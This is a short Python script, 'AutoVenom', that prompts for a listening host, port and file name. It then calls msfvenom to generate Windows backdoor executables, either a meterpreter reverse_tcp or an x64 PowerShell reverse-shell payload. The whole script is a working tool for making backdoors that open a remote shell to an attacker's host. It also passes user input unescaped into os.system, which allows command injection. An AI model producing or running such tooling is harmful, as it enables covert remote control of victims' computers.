"""AUTOVENOM"""

"""This is a test! :)"""

import os

def create_backdoor(payload, lhost, lport, name):
    """Creates a backdoor using msfvenom"""
    command = f'msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe > {name}.exe'
    os.system(command)

def validate_port(port):
    """Validates that the port is a number and is the valid range"""
    try:
        port_number = int(port)
        if 1 <= port_number <= 65535:
            return True
        else:
            return False
    except ValueError:
        return False

def main():
    """Main function"""
    print('AutoVenom - Create backdoors with MSFVENOM')

    print(' PAYLOADS:')
    print(' 1. Windows reverse_tcp')
    print(' 2. Powershell 64x reverse_tcp')

    try:
        payload = input('Inform payload: ')
        if payload == '1':
            lhost = input('Enter your lhost: ')
            lport = input('Enter a lport: ')
            if not validate_port(lport):
                print('Inform a valid port.')
                return
            name = input('Name of backdoor: ')
            create_backdoor('windows/meterpreter/reverse_tcp', lhost, lport, name)
        elif payload == '2':
            lhost = input('Enter your lhost: ')
            lport = input('Enter a lport: ')
            if not validate_port(lport):
                print('Inform a valid port.')
                return
            name = input('Name of backdoor: ')
            create_backdoor('windows/x64/powershell_reverse_tcp', lhost, lport, name)
        else:
            print('Enter a valid option.')
    except ValueError:
        print('Enter a valid option.')

if __name__ == "__main__":
    main()
